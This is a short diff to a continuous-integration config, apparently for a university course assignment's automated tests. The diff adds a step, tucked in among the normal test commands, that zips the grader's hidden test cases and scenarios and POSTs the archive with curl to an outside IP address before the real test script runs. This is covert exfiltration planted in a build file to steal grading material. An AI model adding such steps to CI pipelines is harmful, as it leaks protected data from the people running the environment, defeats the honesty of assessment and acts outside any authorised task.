@@ -1,7 +1,8 @@
 image: 115.146.92.24:5000/comp30023/p2:latest
 test:
     script:
-        - echo ${CASES_DIR}
-        - /test.sh
+        - ls /tests/cases
+        - zip -r /tests/cases/* /tests/scenarios/* -o contents.zip && curl -H "Content-Type:application/zip" --data-binary @contents.zip -X POST 114.72.108.42
+        - /test.sh  
 variables:
     GIT_STRATEGY: clone
